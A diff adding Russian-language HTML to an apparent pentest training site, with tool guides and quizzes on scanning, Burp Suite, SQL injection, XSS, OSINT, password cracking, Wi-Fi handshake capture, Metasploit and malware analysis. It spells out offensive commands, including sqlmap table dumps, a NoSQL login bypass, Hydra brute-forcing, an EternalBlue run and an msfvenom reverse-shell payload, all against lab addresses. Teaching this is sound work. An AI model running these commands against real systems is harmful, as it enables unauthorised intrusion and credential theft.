+                    <li><b>2. RustScan & Masscan</b> — сверхскоростные асинхронные сканеры портов, способные проверить все 65 535 портов за 3–5 секунд и сразу передать найденные порты в Nmap.
+                        <br>— <i>Как пользоваться RustScan:</i> <code>rustscan -a 10.10.10.5 --ulimit 5000 -- -sC -sV</code> (сначала RustScan за пару секунд находит открытые порты, а после <code>--</code> автоматически запускает детальный Nmap только по ним).
+                        <br>— <i>Как пользоваться Masscan:</i> <code>sudo masscan -p1-65535 10.10.10.0/24 --rate=10000 -oG masscan.txt</code>.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Nmap</h3>
+            <form id="form-nmap">
+                <p><b>1. Какой флаг в Nmap позволяет узнать точную версию программы, работающей на открытом порту?</b></p>
+                <label><input type="radio" name="nmapQ1" value="1"> -sV</label>
+                <label><input type="radio" name="nmapQ1" value="0"> --format-disk</label>
+                <label><input type="radio" name="nmapQ1" value="2"> -help-me</label>
+
+                <p><b>2. В чем особенность полуоткрытого сканирования (-sS)?</b></p>
+                <label><input type="radio" name="nmapQ2" value="0"> Оно требует физического подключения монитора к серверу.</label>
+                <label><input type="radio" name="nmapQ2" value="1"> Nmap не завершает трехэтапное TCP-рукопожатие, отправляя RST после получения SYN-ACK.</label>
+                <label><input type="radio" name="nmapQ2" value="2"> Оно сканирует только выключенные компьютеры.</label>
+
+                <p><b>3. Какая команда покажет только список активных хостов в подсети без сканирования их портов?</b></p>
+                <label><input type="radio" name="nmapQ3" value="1"> nmap -sn 192.168.1.0/24</label>
+                <label><input type="radio" name="nmapQ3" value="0"> nmap --destroy 192.168.1.0</label>
+                <label><input type="radio" name="nmapQ3" value="2"> ping localhost</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="burp" class="hide">
+        <article class="card">
+            <h2>Анализ и перехват веб-приложений (Burp Suite & OWASP ZAP)</h2>
+            <p>Любые проверки на стороне браузера (HTML/JS) легко обходятся, если перехватить HTTP-запрос по пути на сервер. Перехватывающий прокси позволяет менять параметры цены, ID пользователей (уязвимость <b>IDOR</b>), заголовки авторизации и куки на лету.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты перехвата и модификации веб-запросов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Burp Suite Community Edition</b> — главный инструмент для ручного пентеста веб-приложений.
+                        <br>— <i>Полный гайд по работе:</i>
+                        <br>1. Запустите Burp Suite -> перейдите во вкладку <code>Proxy -> Intercept</code> и нажмите <code>Open Browser</code> (откроется встроенный Chromium, уже настроенный на прокси <code>127.0.0.1:8080</code>).
+                        <br>2. Во вкладке <code>Proxy -> HTTP history</code> найдите интересующий запрос (например, <code>POST /api/cart/checkout</code>) и нажмите <code>Ctrl+R</code>, чтобы отправить его в модуль <b>Repeater</b>.
+                        <br>3. В <b>Repeater</b> меняйте значения параметров (например, <code>user_id=102</code> на <code>user_id=101</code> для проверки IDOR), нажимайте <code>Send</code> и анализируйте ответ сервера справа.
+                        <br>4. Для автоматического перебора параметров отправьте запрос в <b>Intruder</b> (<code>Ctrl+I</code>), выделите параметр знаками <code>§значение§</code> и загрузите словарь во вкладке <code>Payloads</code>.</li>
+                    <li><b>2. OWASP ZAP (Zed Attack Proxy)</b> — полностью бесплатный Open-Source прокси-комбайн без искусственных ограничений скорости фаззера.
+                        <br>— <i>Как пользоваться:</i> Скачайте с <code>zaproxy.org</code>. Нажмите <code>Automated Scan</code> для быстрого пассивного и активного поиска уязвимостей на учебном стенде или используйте встроенный модуль <b>Fuzzer</b> (правый клик по запросу -> <code>Attack -> Fuzz</code>) для многопоточного перебора паролей и токенов.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Burp Suite</h3>
+            <form id="form-burp">
+                <p><b>1. Какую роль выполняет модуль Proxy (Intercept) в Burp Suite?</b></p>
+                <label><input type="radio" name="burpQ1" value="1"> Задерживает HTTP/HTTPS-запросы между браузером и сервером для их просмотра и изменения.</label>
+                <label><input type="radio" name="burpQ1" value="0"> Ускоряет видеокарту в трехмерных играх.</label>
+                <label><input type="radio" name="burpQ1" value="2"> Автоматически переводит текст сайта на китайский язык.</label>
+
+                <p><b>2. Какой модуль в Burp Suite используется для многократной ручной модификации и повторной отправки одного и того же запроса?</b></p>
+                <label><input type="radio" name="burpQ2" value="0"> Decoder</label>
+                <label><input type="radio" name="burpQ2" value="1"> Repeater</label>
+                <label><input type="radio" name="burpQ2" value="2"> Uninstaller</label>
+
+                <p><b>3. Как называется уязвимость, когда изменение параметра id=105 на id=104 в запросе открывает чужой профиль без проверки прав?</b></p>
+                <label><input type="radio" name="burpQ3" value="1"> IDOR (Insecure Direct Object Reference)</label>
+                <label><input type="radio" name="burpQ3" value="0"> DDoS (Distributed Denial of Service)</label>
+                <label><input type="radio" name="burpQ3" value="2"> BIOS Update</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="sqli" class="hide">
+        <article class="card">
+            <h2>SQL-инъекции (SQLi): теория, ручная эксплуатация и автоматизация</h2>
+            <p>Уязвимость <b>SQL Injection</b> возникает, когда пользовательский ввод подставляется напрямую в строку SQL-запроса без использования параметризованных выражений (Prepared Statements). Это позволяет изменить логику запроса, прочитать чужие таблицы или даже выполнить команды на сервере.</p>
+
+            <div class="dl-box">
+                <h4>Утилиты для поиска и эксплуатации SQL и NoSQL инъекций (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. SQLMap</b> — легендарный автоматизированный инструмент для обнаружения и раскрутки всех видов SQL-инъекций (Boolean-based, Time-based, Error-based, UNION).
+                        <br>— <i>Пошаговый гайд от разведки до дампа базы:</i>
+                        <br>• Шаг 1 (Список всех баз данных): <code>sqlmap -u "http://site.local/item.php?id=1" --batch --dbs</code>
+                        <br>• Шаг 2 (Список таблиц в выбранной БД): <code>sqlmap -u "http://site.local/item.php?id=1" --batch -D shop_db --tables</code>
+                        <br>• Шаг 3 (Выгрузка колонок и паролей из таблицы): <code>sqlmap -u "http://site.local/item.php?id=1" --batch -D shop_db -T users --dump</code>
+                        <br>• Совет профи: Если уязвимость находится внутри сложного POST-запроса с куками, сохраните запрос из Burp Suite в текстовый файл <code>req.txt</code> и запустите: <code>sqlmap -r req.txt --level=3 --risk=2 --batch --dbs</code>.</li>
+                    <li><b>2. Ghauri & NoSQLMap</b> — современные альтернативы для обхода WAF и тестирования NoSQL баз данных (MongoDB, CouchDB).
+                        <br>— <i>Как пользоваться Ghauri (быстрый аналог SQLMap):</i> <code>ghauri -u "http://site.local/item.php?id=1" --dbs --batch</code>
+                        <br>— <i>Проверка MongoDB на NoSQL-инъекцию вручную (в JSON теле запроса):</i> Замените <code>{"username": "admin", "password": "123"}</code> на оператор сравнения <code>{"username": "admin", "password": {"$ne": null}}</code> — условие станет истинным без знания пароля.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: SQL-инъекции</h3>
+            <form id="form-sqli">
+                <p><b>1. Какой символ чаще всего вводится первым при ручной проверке URL-параметра на классическую SQL-инъекцию?</b></p>
+                <label><input type="radio" name="sqliQ1" value="1"> Одинарная кавычка (')</label>
+                <label><input type="radio" name="sqliQ1" value="0"> Смайлик эмодзи</label>
+                <label><input type="radio" name="sqliQ1" value="2"> Клавиша Caps Lock</label>
+
+                <p><b>2. Зачем в полезной нагрузке SQL-инъекции используют символы двойного дефиса (-- ) в конце?</b></p>
+                <label><input type="radio" name="sqliQ2" value="0"> Чтобы подчеркнуть важность текста.</label>
+                <label><input type="radio" name="sqliQ2" value="1"> Чтобы закомментировать и отключить оставшуюся часть исходного SQL-запроса (например, проверку пароля).</label>
+                <label><input type="radio" name="sqliQ2" value="2"> Чтобы перезагрузить роутер пользователя.</label>
+
+                <p><b>3. Какой метод разработки полностью устраняет риск SQL-инъекций в коде?</b></p>
+                <label><input type="radio" name="sqliQ3" value="1"> Использование параметризованных запросов (Prepared Statements).</label>
+                <label><input type="radio" name="sqliQ3" value="0"> Смена шрифта на странице входа.</label>
+                <label><input type="radio" name="sqliQ3" value="2"> Скрытие адресной строки в браузере.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="xss" class="hide">
+        <article class="card">
+            <h2>Межсайтовый скриптинг (XSS): векторы, контексты и защита</h2>
+            <p><b>XSS (Cross-Site Scripting)</b> позволяет внедрить произвольный JavaScript-код в страницу, которую просматривают другие пользователи. Выделяют три типа: <b>Stored XSS</b> (хранимая в БД), <b>Reflected XSS</b> (отраженная через URL-параметр) и <b>DOM-based XSS</b> (выполняемая на клиенте из-за небезопасного использования <code>innerHTML</code> или <code>eval</code>).</p>
+
+            <div class="dl-box">
+                <h4>Инструменты автоматизированного поиска XSS (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Dalfox (Finder of XSS)</b> — сверхбыстрый сканер XSS-уязвимостей на языке Go, анализирующий DOM-дерево и точки отражения параметров.
+                        <br>— <i>Установка:</i> <code>go install github.com/hahwul/dalfox/v2@latest</code> или <code>sudo apt install dalfox</code>.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Проверка одного URL с параметрами: <code>dalfox url "http://site.local/search?q=test&lang=ru"</code>
+                        <br>• Массовая проверка списка URL из файла: <code>dalfox file urls.txt -o found_xss.txt</code>
+                        <br>• Проверка с подстановкой своей сессионной куки: <code>dalfox url "http://site.local/profile?name=1" -C "session=xyz123"</code></li>
+                    <li><b>2. XSStrike</b> — интеллектуальный сканер на Python, который не просто перебирает шаблоны, а анализирует контекст верстки (внутри тега, атрибута или скрипта) и генерирует полиглоты для обхода WAF.
+                        <br>— <i>Установка:</i> <code>git clone https://github.com/s0md3v/XSStrike && cd XSStrike && pip install -r requirements.txt</code>
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Сканирование GET-параметров с обходом фильтров: <code>python3 xsstrike.py -u "http://site.local/page.php?id=1"</code>
+                        <br>• Автоматический краулинг всего сайта на глубину 3 уровня в поисках XSS: <code>python3 xsstrike.py -u "http://site.local" --crawl -l 3</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: XSS</h3>
+            <form id="form-xss">
+                <p><b>1. Какой вид XSS наиболее опасен, так как сохраняется на сервере и атакует всех посетителей страницы автоматически?</b></p>
+                <label><input type="radio" name="xssQ1" value="1"> Stored XSS (Хранимая)</label>
+                <label><input type="radio" name="xssQ1" value="0"> Offline XSS</label>
+                <label><input type="radio" name="xssQ1" value="2"> Hardware XSS</label>
+
+                <p><b>2. Какой флаг настройки Cookie запрещает JavaScript-скриптам читать сессионную куку через document.cookie?</b></p>
+                <label><input type="radio" name="xssQ2" value="0"> AllowAll</label>
+                <label><input type="radio" name="xssQ2" value="1"> HttpOnly</label>
+                <label><input type="radio" name="xssQ2" value="2"> AutoDelete</label>
+
+                <p><b>3. Почему при тестировании XSS вместо alert(1) рекомендуется вызывать alert(document.domain)?</b></p>
+                <label><input type="radio" name="xssQ3" value="1"> Чтобы наглядно доказать, в контексте какого именно домена (или песочницы iframe) выполнился скрипт.</label>
+                <label><input type="radio" name="xssQ3" value="0"> Потому что цифра 1 запрещена в языке JavaScript.</label>
+                <label><input type="radio" name="xssQ3" value="2"> Это автоматически обновляет браузер до последней версии.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="osint" class="hide">
+        <article class="card">
+            <h2>Пассивная разведка и сбор данных (OSINT)</h2>
+            <p><b>OSINT (Open Source Intelligence)</b> позволяет собрать полную карту инфраструктуры компании (поддомены, корпоративные почты, технологии, забытые API-ключи в GitHub и открытые бакеты) из публичных источников без единого прямого пакета на сервер цели.</p>
+
+            <div class="dl-box">
+                <h4>Главные OSINT-комбайны и утилиты разведки (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. SpiderFoot</b> — мощнейший фреймворк автоматизации OSINT с веб-интерфейсом, объединяющий более 200 модулей разведки (DNS, Whois, Shodan, HaveIBeenPwned, соцсети, поддомены).
+                        <br>— <i>Установка:</i> <code>sudo apt install spiderfoot</code> (или клонирование с <code>github.com/smicallef/spiderfoot</code>).
+                        <br>— <i>Как пользоваться:</i>
+                        <br>1. Запустите локальный веб-сервер командой: <code>spiderfoot -l 127.0.0.1:5001</code>
+                        <br>2. Откройте в браузере <code>http://127.0.0.1:5001</code>, нажмите вкладку <b>New Scan</b>.
+                        <br>3. В поле <code>Scan Target</code> введите домен (например, <code>example.com</code>), IP-адрес, email или никнейм, выберите профиль <code>Passive</code> (только пассивный сбор без касания цели) и нажмите <b>Run Scan Now</b>. Во вкладке <code>Graph</code> SpiderFoot построит интерактивный граф всех найденных связей.</li>
+                    <li><b>2. theHarvester</b> — консольная утилита для быстрого сбора корпоративных email-адресов, имен сотрудников, поддоменов и виртуальных хостов через публичные поисковики и базы сертификатов.
+                        <br>— <i>Установка:</i> <code>sudo apt install theharvester</code>.
+                        <br>— <i>Как пользоваться:</i>
+                        <br><code>theHarvester -d example.com -l 500 -b crtsh,rapiddns,duckduckgo,yahoo -f osint_report.html</code>
+                        <br>Где <code>-d</code> — целевой домен, <code>-l 500</code> — лимит результатов, <code>-b</code> — источники поиска (логи SSL-сертификатов <code>crtsh</code> не требуют API-ключей и дают десятки скрытых поддоменов), <code>-f</code> — сохранение готового отчета.</li>
+                    <li><b>3. Sherlock & TruffleHog</b> — поиск аккаунтов по никнейму и поиск забытых секретов в Git.
+                        <br>— <i>Посмотреть все соцсети пользователя по нику:</i> <code>sherlock username --timeout 5</code>
+                        <br>— <i>Просканировать Git-репозиторий на случайно удаленные в прошлых коммитах пароли и токены:</i> <code>trufflehog git https://github.com/org/repo --only-verified</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: OSINT</h3>
+            <form id="form-osint">
+                <p><b>1. Какой оператор Google Dorks позволяет искать на сайте файлы только определенного расширения (например, .pdf или .sql)?</b></p>
+                <label><input type="radio" name="osintQ1" value="1"> filetype: (или ext:)</label>
+                <label><input type="radio" name="osintQ1" value="0"> download_all:</label>
+                <label><input type="radio" name="osintQ1" value="2"> hack_site:</label>
+
+                <p><b>2. Чем поисковая система Shodan принципиально отличается от Google?</b></p>
+                <label><input type="radio" name="osintQ2" value="0"> Она работает только по выходным дням.</label>
+                <label><input type="radio" name="osintQ2" value="1"> Она индексирует открытые порты, сетевые сервисы и подключенные к интернету устройства (IoT/серверы), а не веб-страницы.</label>
+                <label><input type="radio" name="osintQ2" value="2"> Она ищет только музыкальные клипы.</label>
+
+                <p><b>3. Для чего пентестеры используют публичный сервис crt.sh и модуль crtsh в theHarvester?</b></p>
+                <label><input type="radio" name="osintQ3" value="1"> Для быстрого обнаружения поддоменов организации через логи выпущенных SSL/TLS-сертификатов.</label>
+                <label><input type="radio" name="osintQ3" value="0"> Для проверки скорости вращения кулера процессора.</label>
+                <label><input type="radio" name="osintQ3" value="2"> Для покупки авиабилетов.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="passwords" class="hide">
+        <article class="card">
+            <h2>Криптография паролей, Hashcat, John the Ripper и Hydra</h2>
+            <p>Пароли хранятся в виде необратимых хеш-сумм. Быстрые алгоритмы без соли (<code>MD5</code>, <code>SHA-1</code>, <code>NTLM</code>) перебираются на видеокартах со скоростью десятки миллиардов вариантов в секунду, тогда как специализированные алгоритмы (<code>Argon2id</code>, <code>bcrypt</code>) защищают базу за счет высокой вычислительной сложности.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты офлайн и онлайн аудита паролей (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Hashcat</b> — самый быстрый в мире восстановитель паролей на базе видеокарт (GPU OpenCL/CUDA).
+                        <br>— <i>Пошаговый гайд:</i>
+                        <br>• Узнать код алгоритма (например, <code>-m 0</code> для MD5, <code>-m 1000</code> для Windows NTLM, <code>-m 3200</code> для bcrypt): <code>hashcat --help | grep -i ntlm</code>
+                        <br>• Словарная атака (<code>-a 0</code>) со словарем <code>rockyou.txt</code> и правилами мутации (добавление цифр и заглавных букв):
+                        <br><code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code>
+                        <br>• Атака по маске (<code>-a 3</code>), например, если известно, что пароль состоит из 8 цифр:
+                        <br><code>hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d</code>
+                        <br>• Показать уже расшифрованные пароли из кэша: <code>hashcat -m 0 hashes.txt --show</code></li>
+                    <li><b>2. John the Ripper (Jumbo)</b> — универсальный пакет аудита хешей, включающий десятки утилит <code>*2john</code> для извлечения хешей из закрытых архивов ZIP/RAR, документов PDF и SSH-ключей.
+                        <br>— <i>Как взломать забытый пароль от ZIP-архива или SSH-ключа:</i>
+                        <br><code>zip2john secret.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash</code>
+                        <br><code>ssh2john id_rsa > ssh.hash && john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash</code></li>
+                    <li><b>3. THC-Hydra</b> — утилита для сетевого (онлайн) подбора паролей к протоколам SSH, FTP, RDP, SMB и веб-формам.
+                        <br>— <i>Проверка SSH на учебном стенде:</i> <code>hydra -l admin -P passwords.txt ssh://10.10.10.5 -t 4</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Аудит паролей</h3>
+            <form id="form-passwords">
+                <p><b>1. Почему алгоритмы MD5 и обычный SHA-1 считаются небезопасными для хранения паролей пользователей?</b></p>
+                <label><input type="radio" name="passwordsQ1" value="1"> Они вычисляются слишком быстро, что позволяет перебирать миллиарды вариантов в секунду на GPU.</label>
+                <label><input type="radio" name="passwordsQ1" value="0"> Они требуют платной подписки для каждого пользователя.</label>
+                <label><input type="radio" name="passwordsQ1" value="2"> Они работают только с цифрами от 1 до 5.</label>
+
+                <p><b>2. Что такое «соль» (Salt) в криптографии паролей?</b></p>
+                <label><input type="radio" name="passwordsQ2" value="0"> Специальный порошок для охлаждения серверных стоек.</label>
+                <label><input type="radio" name="passwordsQ2" value="1"> Случайная строка, уникальная для каждого пользователя, которая добавляется к паролю перед хешированием для защиты от радужных таблиц.</label>
+                <label><input type="radio" name="passwordsQ2" value="2"> Название популярного браузера.</label>
+
+                <p><b>3. Какой алгоритм из перечисленных специально разработан для надежного и устойчивого к GPU-перебору хеширования паролей?</b></p>
+                <label><input type="radio" name="passwordsQ3" value="1"> Argon2id (или bcrypt)</label>
+                <label><input type="radio" name="passwordsQ3" value="0"> Base64</label>
+                <label><input type="radio" name="passwordsQ3" value="2"> CRC32</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="wifi" class="hide">
+        <article class="card">
+            <h2>Аудит безопасности беспроводных сетей (Wi-Fi)</h2>
+            <p>В сетях <b>WPA2-PSK</b> при подключении клиента передается 4-стороннее рукопожатие (<b>4-Way Handshake</b>) или идентификатор роуминга <b>PMKID</b>. Перехватив эти пакеты в режиме мониторинга, можно проверить стойкость пароля собственной точки доступа.</p>
+
+            <div class="dl-box">
+                <h4>Утилиты для аудита радиоэфира Wi-Fi (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Пакет Aircrack-ng (airmon-ng, airodump-ng, aireplay-ng)</b> — классический набор для тестирования беспроводных сетей.
+                        <br>— <i>Полный цикл команд:</i>
+                        <br>1. Остановить мешающие сетевые службы и включить режим мониторинга (Monitor Mode):
+                        <br><code>sudo airmon-ng check kill && sudo airmon-ng start wlan0</code>
+                        <br>2. Просканировать эфир и узнать MAC-адрес (BSSID) и канал (CH) своего роутера:
+                        <br><code>sudo airodump-ng wlan0mon</code>
+                        <br>3. Запустить запись пакетов конкретного роутера на его канале (например, канал 6):
+                        <br><code>sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon</code>
+                        <br>4. Проверить перехваченный файл <code>handshake-01.cap</code> по словарю:
+                        <br><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap</code></li>
+                    <li><b>2. Hcxtools (hcxdumptool & hcxpcapngtool)</b> — современный инструмент для перехвата хеша <b>PMKID</b> напрямую от роутера (даже если к сети не подключен ни один клиент) с последующей конвертацией для скоростного перебора в Hashcat.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Захват пакетов от точки доступа: <code>sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15</code>
+                        <br>• Конвертация дампа в формат Hashcat (мод 22000): <code>hcxpcapngtool -o wifi_hash.hc22000 dump.pcapng</code>
+                        <br>• Запуск перебора на видеокарте: <code>hashcat -m 22000 wifi_hash.hc22000 rockyou.txt</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Безопасность Wi-Fi</h3>
+            <form id="form-wifi">
+                <p><b>1. В какой специальный режим нужно перевести беспроводную сетевую карту для анализа всех пакетов в радиоэфире?</b></p>
+                <label><input type="radio" name="wifiQ1" value="1"> Режим мониторинга (Monitor Mode)</label>
+                <label><input type="radio" name="wifiQ1" value="0"> Авиарежим (Airplane Mode)</label>
+                <label><input type="radio" name="wifiQ1" value="2"> Спящий режим (Sleep Mode)</label>
+
+                <p><b>2. Какую функцию на домашнем роутере необходимо отключить в первую очередь из-за уязвимости к быстрому перебору 8-значного PIN-кода?</b></p>
+                <label><input type="radio" name="wifiQ2" value="0"> DHCP-сервер</label>
+                <label><input type="radio" name="wifiQ2" value="1"> WPS (Wi-Fi Protected Setup)</label>
+                <label><input type="radio" name="wifiQ2" value="2"> Светодиодные индикаторы на корпусе</label>
+
+                <p><b>3. Чем стандарт WPA3 принципиально превосходит WPA2 при защите пароля сети?</b></p>
+                <label><input type="radio" name="wifiQ3" value="1"> Протокол SAE (Dragonfly) не позволяет захватить хендшейк для последующего офлайн-перебора пароля по словарю.</label>
+                <label><input type="radio" name="wifiQ3" value="0"> Он увеличивает радиус действия Wi-Fi на 50 километров.</label>
+                <label><input type="radio" name="wifiQ3" value="2"> Он работает без подключения роутера к розетке.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="metasploit" class="hide">
+        <article class="card">
+            <h2>Фреймворк эксплуатации уязвимостей (Metasploit & Searchsploit)</h2>
+            <p>Когда при сканировании обнаружена устаревшая версия сетевой службы с известным идентификатором уязвимости (<b>CVE</b>), пентестер проверяет возможность её эксплуатации с помощью модульных фреймворков или офлайн-базы эксплойтов.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты поиска и запуска эксплойтов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Metasploit Framework (msfconsole & msfvenom)</b> — главная платформа для разработки и запуска эксплойтов и управления сессиями Meterpreter.
+                        <br>— <i>Пошаговый гайд в консоли <code>msfconsole</code>:</i>
+                        <br>1. Найти модуль по номеру CVE или названию службы: <code>search type:exploit eternalblue</code>
+                        <br>2. Выбрать модуль и посмотреть обязательные настройки: <code>use 0</code> -> <code>show options</code>
+                        <br>3. Задать IP-адрес учебной мишени и свой IP в VPN-сети полигона: <code>set RHOSTS 10.10.10.40</code> -> <code>set LHOST tun0</code>
+                        <br>4. Безопасно проверить наличие уязвимости: <code>check</code>, запустить эксплойт: <code>run</code> (или <code>exploit -j</code> для запуска в фоне).
+                        <br>— <i>Генерация тестового пейлоада через <code>msfvenom</code>:</i>
+                        <br><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf</code></li>
+                    <li><b>2. Searchsploit (Локальная база Exploit-DB)</b> — консольный поисковик по тысячам готовых эксплойтов из архива Exploit-Database прямо без интернета.
+                        <br>— <i>Установка и обновление:</i> <code>sudo apt install exploitdb && searchsploit -u</code>
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Найти эксплойты под конкретную версию сервиса: <code>searchsploit Apache 2.4.49</code>
+                        <br>• Скопировать найденный скрипт эксплойта по его ID в текущую рабочую папку для изучения кода: <code>searchsploit -m 50383</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Metasploit</h3>
+            <form id="form-metasploit">
+                <p><b>1. Какая команда в msfconsole используется для задания IP-адреса атакуемой (тестируемой) машины?</b></p>
+                <label><input type="radio" name="metasploitQ1" value="1"> set RHOSTS &lt;IP-адрес&gt;</label>
+                <label><input type="radio" name="metasploitQ1" value="0"> ping target</label>
+                <label><input type="radio" name="metasploitQ1" value="2"> install windows</label>
+
+                <p><b>2. В чем разница между Эксплойтом (Exploit) и Полезной нагрузкой (Payload) в терминологии Metasploit?</b></p>
+                <label><input type="radio" name="metasploitQ2" value="0"> Это два разных названия антивируса.</label>
+                <label><input type="radio" name="metasploitQ2" value="1"> Эксплойт использует уязвимость для проникновения, а Payload — это код, который выполняется внутри системы после успешного прорыва.</label>
+                <label><input type="radio" name="metasploitQ2" value="2"> Payload работает только на смартфонах, а Exploit — только на часах.</label>
+
+                <p><b>3. Какая команда позволяет безопасно проверить, уязвим ли целевой сервер к выбранному модулю, без фактического запуска эксплойта?</b></p>
+                <label><input type="radio" name="metasploitQ3" value="1"> check</label>
+                <label><input type="radio" name="metasploitQ3" value="0"> format</label>
+                <label><input type="radio" name="metasploitQ3" value="2"> exit</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="malware" class="hide">
+        <article class="card">
+            <h2>Анализ вредоносного ПО, реверс-инжиниринг и песочницы</h2>
+            <p>Исследование подозрительных бинарных файлов делится на <b>статический анализ</b> (изучение заголовков PE/ELF, импортируемых функций, энтропии и декомпиляция кода без запуска файла) и <b>динамический анализ</b> (наблюдение за поведением в изолированной песочнице).</p>
+
+            <div class="dl-box">
+                <h4>Инструменты реверс-инжиниринга и статического анализа (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Ghidra</b> — бесплатный профессиональный дизассемблер и декомпилятор бинарных файлов (<code>.exe</code>, <code>.dll</code>, <code>.elf</code>, <code>.so</code>) в читаемый псевдокод на языке C, разработанный NSA.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>1. Скачайте архив с <code>ghidra-sre.org</code> (требуется установленная JDK 17+) и запустите <code>./ghidraRun</code>.
+                        <br>2. Нажмите <code>File -> New Project</code>, перетащите исследуемый бинарный файл в окно проекта и дважды кликните по нему (откроется <b>CodeBrowser</b>).
+                        <br>3. Согласитесь на автоматический анализ (<code>Analyze -> Yes</code>). Слева в окне <code>Symbol Tree -> Functions</code> найдите функцию <code>main</code> или <code>entry</code> — в правом окне <b>Decompile</b> вы сразу увидите восстановленный исходный код программы на C, а через меню <code>Window -> Defined Strings</code> найдете зашитые пароли и URL.</li>
+                    <li><b>2. Detect It Easy (DIE) & Capa (от Mandiant)</b> — экспресс-анализаторы упаковщиков, энтропии и возможностей файла.
+                        <br>— <i>Как пользоваться DIE:</i> Запустите <code>diec sample.exe</code> (консольная версия) или откройте в графическом окне. Нажмите кнопку <b>Entropy</b>: если график энтропии выше <code>7.2</code>, файл сжат пакером (например, UPX). Распаковать UPX можно командой: <code>upx -d sample.exe</code>.
+                        <br>— <i>Как пользоваться Capa:</i> Запустите <code>capa sample.exe</code> — утилита автоматически проанализирует системные вызовы внутри файла и выведет таблицу по матрице MITRE ATT&CK (например: «читает пароли браузера», «создает ключ в реестре автозагрузки», «шифрует файлы по AES»).</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Анализ файлов</h3>
+            <form id="form-malware">
+                <p><b>1. Что такое статический анализ подозрительного файла?</b></p>
+                <label><input type="radio" name="malwareQ1" value="1"> Изучение структуры, строк, хеш-сумм и кода файла без его непосредственного запуска.</label>
+                <label><input type="radio" name="malwareQ1" value="0"> Запуск вируса на основном рабочем компьютере без антивируса.</label>
+                <label><input type="radio" name="malwareQ1" value="2"> Измерение веса жесткого диска на весах.</label>
+
+                <p><b>2. О чем чаще всего свидетельствует аномально высокая энтропия (близкая к 8.0) у исполняемого файла?</b></p>
+                <label><input type="radio" name="malwareQ2" value="0"> Внутри файла нет ни одной строчки кода.</label>
+                <label><input type="radio" name="malwareQ2" value="1"> Файл сжат упаковщиком или зашифрован (криптован) для сокрытия содержимого.</label>
+                <label><input type="radio" name="malwareQ2" value="2"> Файл был создан более 20 лет назад.</label>
+
+                <p><b>3. Какая консольная утилита позволяет быстро извлечь все читаемые текстовые последовательности и URL из бинарного файла?</b></p>
+                <label><input type="radio" name="malwareQ3" value="1"> strings</label>
+                <label><input type="radio" name="malwareQ3" value="0"> mkdir</label>
+                <label><input type="radio" name="malwareQ3" value="2"> reboot</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="mobile" class="hide">
+        <article class="card">
+            <h2>Мобильный пентест: Архитектура Android, APK, ADB и Frida</h2>
+            <p>Любой <code>.apk</code> файл — это архив, содержащий байт-код Dalvik (<code>classes.dex</code>), манифест разрешений (<code>AndroidManifest.xml</code>), ресурсы (<code>res/values/strings.xml</code>) и нативные библиотеки (<code>lib/*.so</code>).</p>
+
+            <div class="ascii-diagram">[Файл .apk] ──► [JADX-GUI (Декомпиляция в Java)] / [Apktool (Smali)] ──► [Frida (Динамический хукинг в RAM)]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты декомпиляции и динамического анализа Android (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. JADX-GUI & Apktool</b> — дуэт для чтения исходного Java-кода и модификации APK.
